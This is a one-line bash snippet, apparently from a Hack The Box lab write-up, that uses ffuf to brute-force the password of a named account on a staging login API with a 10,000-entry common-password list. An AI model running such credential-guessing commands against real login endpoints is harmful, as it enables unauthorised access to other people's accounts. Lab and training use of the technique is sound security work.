
```bash
ffuf -X POST -u http://staging.silentium.htb/api/v1/auth/login -H 'Content-Type: application/json' -d '{"email":"ben@silentium.htb","password":"FUZZ"}' -w /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt -fr 'Incorrect Email or Password'
```

